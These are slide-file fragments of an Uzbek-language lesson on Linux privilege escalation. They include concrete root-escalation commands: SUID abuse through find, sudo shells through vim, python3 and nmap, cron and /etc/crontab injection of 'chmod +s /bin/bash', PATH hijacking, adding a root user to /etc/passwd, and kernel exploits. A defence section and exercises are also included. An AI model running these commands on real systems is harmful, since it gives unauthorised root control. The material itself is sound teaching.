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2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect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0"/>
            <a:ext cx="20116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E05252"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⬆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913765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6858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6324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Huquqlarni kengaytirish — nazariya va amaliyot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5720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DARS REJASI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nima o'rganamiz?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822960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572768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nima?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011680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huquq tizimi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822960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0592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450592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/ SGID fayllar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889504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889504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noto'g'ri sozlama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822960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28416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3328416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zaifliqlari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767328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3767328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Hijacking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06240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4206240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mashqlar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645152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4645152"/>
            <a:ext cx="6858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usullari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KIRISH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nima?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Tizimda past huquqli foydalanuvchi sifatida kirgach,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huquq (root) olish jarayoni.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840480" cy="219456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2606040"/>
            <a:ext cx="3840480" cy="219456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2491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8390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OLDIN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90672"/>
            <a:ext cx="3566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www-data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33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/var/www kirishi bor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3291840"/>
            <a:ext cx="457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525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83480" y="272491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KEYIN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3090672"/>
            <a:ext cx="3566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tizim nazorati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NAZARIYA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huquq tizimi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822960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664208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64208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huquq — hamma narsa mumkin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624328"/>
            <a:ext cx="640080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7683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624328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1–999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624328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foydalanuvchilari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624328"/>
            <a:ext cx="1737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Xizmatlar, demonlar (nginx, www-data)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584448"/>
            <a:ext cx="457200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584448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4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1000+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3584448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foydalanuvchilar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83155" y="4547235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— UID 0 ga yetish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UMUMIY KO'RINISH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zaiflik yo'llari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27632"/>
            <a:ext cx="397764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92808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/ SGID fayllar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397764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00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24912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noto'g'ri sozlama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397764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22192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zaifliqlari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00600" y="1627632"/>
            <a:ext cx="397764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892808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8928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1627632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Hijacking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00600" y="2724912"/>
            <a:ext cx="397764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990088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9900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724912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 mumkin fayllar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00600" y="3822192"/>
            <a:ext cx="397764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4087368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0873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3822192"/>
            <a:ext cx="3154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exploitlari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/ SGID nima?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8229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(Set User ID) — fayl ishga tushganda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egasining (ko'pincha root) huquqlari bilan ishlaydi.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560320"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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60320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60320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43200"/>
            <a:ext cx="79552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-rwsr-xr-x  1  root  root  12345  /usr/bin/passwd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^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←  SUID bit — root huquqi bilan ishlaydi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93192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490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xavfli?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Noto'g'ri SUID dastur root shell berishi mumkin.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4114800" cy="11887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490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misol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4114800"/>
            <a:ext cx="3749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/usr/bin/passwd — parol o'zgartirish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/usr/bin/sudo — imtiyozli bajarish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01 — AMALIYOT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SUID: Topish va foydalanish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1 — SUID fayllarni toping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82296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115" y="1892808"/>
            <a:ext cx="79552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/ -perm -4000 -type f 2&gt;/dev/null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/usr/bin/passwd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/usr/bin/find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/usr/bin/vim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/usr/bin/python3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14833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2 — Zaif SUID dasturdan foydalanish (masalan: find)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58845"/>
            <a:ext cx="8229600" cy="1491615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115" y="3495548"/>
            <a:ext cx="795528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-exec /bin/sh -p \; -quit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-p   : imtiyozlarni saqlash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Shell root huquqlari bilan ochiladi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 tekshirish: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uid=1000(user) gid=1000(user) euid=0(root)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noto'g'ri sozlama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foydalanuvchiga muayyan buyruqlarni root sifatida bajarishga ruxsat beradi.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Noto'g'ri sozlansa — root huquqi berishi mumkin.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Nimani bajarish mumkinligini tekshirish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79776"/>
            <a:ext cx="82296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52420"/>
            <a:ext cx="7955280" cy="10071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-l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user may run the following commands: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(ALL) NOPASSWD: /usr/bin/vim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(ALL) NOPASSWD: /usr/bin/python3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4114800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foydalanuvchi nomidan bajarish mumkin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425696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NOPASSWD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4425696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Parolsiz ishlaydi — juda xavfli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736592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!authenticate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4736592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Autentifikatsiyadan o'tib ketish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02 — AMALIYOT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orqali root olish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2704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vim orqali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931920" cy="11704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75104"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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75104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75104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65760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vim -c '!sh'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vim ichida shell ochiladi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Shell root huquqi bilan ishlaydi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152704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python3 orqali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883664"/>
            <a:ext cx="3931920" cy="11704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975104"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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975104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975104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57984"/>
            <a:ext cx="365760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python3 -c "import os; os.system('/bin/bash')"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GTFOBins — sudoga ruxsat berilgan dasturlar uchun exploit bazasi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82296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675888"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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675888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675888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58768"/>
            <a:ext cx="79552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Har qanday NOPASSWD dastur uchun tekshiring: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https://gtfobins.github.io/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nmap --interactive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nmap&gt; !sh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shell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zaifliqlari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— rejalashtirilgan vazifalar. Root cron skriptiga yoza olsangiz — root bo'lasiz.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44345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1 — Cron fayllarini ko'rish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4655" y="2024126"/>
            <a:ext cx="822960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815" y="2064131"/>
            <a:ext cx="795528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/etc/crontab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 *  root  /opt/scripts/backup.sh   ← har daqiqa root bajaradi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82879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2 — Skript yozish mumkinmi?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3880"/>
            <a:ext cx="8229600" cy="175387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3499"/>
            <a:ext cx="79552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 /opt/scripts/backup.sh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-rwxrwxrwx 1 root root  /opt/scripts/backup.sh   ← hamma yoza oladi!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"chmod +s /bin/bash" &gt;&gt; /opt/scripts/backup.sh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daqiqa o'tgach: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-p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bash-5.0# id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uid=1000(user) euid=0(root)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Hijacking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dasturi to'liq yo'l ko'rsatmasdan buyruq chaqirsa,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$PATH dagi birinchi topilgan fayl bajariladi.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Zaif dastur kodi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79776"/>
            <a:ext cx="393192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815" y="2871216"/>
            <a:ext cx="3657600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/usr/local/bin/sysinfo (SUID root)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system("id");   // to'liq yo'l yo'q!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Hujum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779776"/>
            <a:ext cx="393192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210" y="2871216"/>
            <a:ext cx="3657600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"/bin/bash" &gt; /tmp/id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/tmp/id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PATH=/tmp:$PATH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/usr/local/bin/sysinfo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shell ochiladi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Sabab: system("id") — /bin/id emas, $PATH dan qidiradi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 mumkin bo'lgan muhim fayllar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74343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8229600" cy="16916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 mumkin bo'lsa — root foydalanuvchi qo'shish mumkin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7724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openssl passwd -1 password123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$1$salt$hashedpass...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"hacker:$1$salt$hashedpass:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd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 hacker   → root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6916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747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/etc/crontab yoki cron.d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 mumkin bo'lsa — root sifatida buyruq qo'shish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87952"/>
            <a:ext cx="77724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"* * * * * root chmod +s /bin/bash" &gt;&gt; /etc/crontab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8280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4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Tekshirish: find / -writable -type f 2&gt;/dev/null | grep -v proc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VEKTOR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Exploitlari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kernel versiyalarida ma'lum zaifliklar mavjud.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Yamoqlanmagan tizimda to'g'ridan-to'g'ri root olish mumkin.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468880"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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68880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795528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Kernel versiyasini ko'rish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-a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host 4.4.0-21-generic #37-Ubuntu SMP ...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Exploit qidirish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searchsploit linux kernel 4.4.0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Mashhur kernel exploitlar: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DirtyCOW    (CVE-2016-5195)  — 2.6.22 ... 4.8.3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DirtyPipe   (CVE-2022-0847)  — 5.8 ... 5.16.11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PwnKit      (CVE-2021-4034)  — polkit (pkexec)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Kernel exploitlar tizimni buzishi mumkin. Faqat ruxsat berilgan muhitda sinab ko'ring.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AMALIYOT — BOSQICH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o'rganish (Enumeration)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36192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Hujumdan oldin tizimni to'liq o'rganish kerak.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2996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ma'lumoti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2029968"/>
            <a:ext cx="5577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 &amp;&amp; cat /etc/os-release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2374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foydalanuvchi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523744"/>
            <a:ext cx="5577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&amp;&amp; whoami &amp;&amp;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822960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175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huquqlari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3017520"/>
            <a:ext cx="5577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511296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fayllar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511296"/>
            <a:ext cx="5577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-perm -4000 -type f 2&gt;/dev/null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822960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0507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vazifalari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4005072"/>
            <a:ext cx="5577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/etc/crontab &amp;&amp; ls /etc/cron.*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49884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4498848"/>
            <a:ext cx="5577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-tuln &amp;&amp; ip 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AMALIYOT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mashq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8229600" cy="106070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11096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1109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64208"/>
            <a:ext cx="7132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topib exploit qilish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048256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/ -perm -4000 -type f 2&gt;/dev/null      2.  Noto'g'ri SUID dasturni aniqlang      3.  GTFOBins dan exploit toping va bajarilg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8229600" cy="106070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3063240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632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816352"/>
            <a:ext cx="7132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zaifligini topish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20040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sudo -l bajarib ko'ring      2.  NOPASSWD dasturni aniqlang      3.  GTFOBins dan shell oling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8229600" cy="1060704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215384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21538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968496"/>
            <a:ext cx="7132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hujumi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352544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cat /etc/crontab ni ko'ring      2.  Yozish mumkin skriptni toping      3.  Reverse shell yoki chmod +s qo'shing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HIMOYA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himoyalanish kerak?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123444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SUID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572768"/>
            <a:ext cx="4023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Keraksiz SUID bitlarni o'chiring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72768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-perm -4000 | audit qiling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123444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39696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Sudo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139696"/>
            <a:ext cx="4023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NOPASSWD va (ALL) ni minimumga tushiring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139696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/etc/sudoers ni qat'iy sozlang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123444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6624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Cron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706624"/>
            <a:ext cx="4023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skriptlariga yozish huquqini cheklang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706624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700 /opt/scripts/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73552"/>
            <a:ext cx="123444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273552"/>
            <a:ext cx="4023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muntazam yangilang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273552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upgrade yoki yum update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23444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0480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840480"/>
            <a:ext cx="4023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Skriptlarda to'liq yo'l yozing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840480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/bin/id — system("id") emas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123444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07408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4407408"/>
            <a:ext cx="4023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LinPEAS va lynis bilan tekshirib turing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4407408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lynis audit system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5C2020"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="5C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— Linux kiberxavfsizligining asosi.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59736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5973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 / SGID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2377440"/>
            <a:ext cx="5577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Keraksiz bitlar — root shellga yo'l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008376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083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926080"/>
            <a:ext cx="5577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NOPASSWD va (ALL) — jiddiy xavf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557016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5701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3474720"/>
            <a:ext cx="5577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 mumkin skript — root imkoniyati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2336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54680" y="4023360"/>
            <a:ext cx="5577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yo'lsiz system() — aldanuvchi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654296"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5C202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5429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57200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4680" y="4572000"/>
            <a:ext cx="5577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yangilanish + minimal huquq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5762</Words>
  <Application>WPS Presentation</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>431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Arial</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>DejaVu Sans</vt:lpstr>
      <vt:lpstr>微软雅黑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lobo</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-07-04T05:24:28Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-04T05:24:28Z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